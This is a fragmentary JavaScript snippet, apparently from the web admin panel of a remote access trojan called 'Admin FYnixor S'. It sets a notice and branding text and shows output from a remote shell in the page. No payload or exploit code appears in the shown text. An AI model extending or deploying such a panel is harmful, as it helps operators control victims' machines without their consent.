...
pd3.innerHTML="<center> <h3 style='color:red'>•Notice•<h3> </center><br>This is an Open Source RAT named <b style='color:gold'>Admin FYnixor S </b>available for free on <a href='https://github.com/KONTOLODON' style='color:#0f8;'>GitHub</a>. Reselling , Changing Brand Name , Logo  of free version are strictly prohibited.";
...
pd.innerHTML="&copy; Yokoto_saiba";
document.getElementById("tophead").appendChild(pd);
$(".h4").text("Admin FYnixor S");
...
$("#shellcmd").css("display","block");
$("#shelldata").html("Admin FYnixor S Shell<br><br>"+o.replaceAll("\n","<br>"))
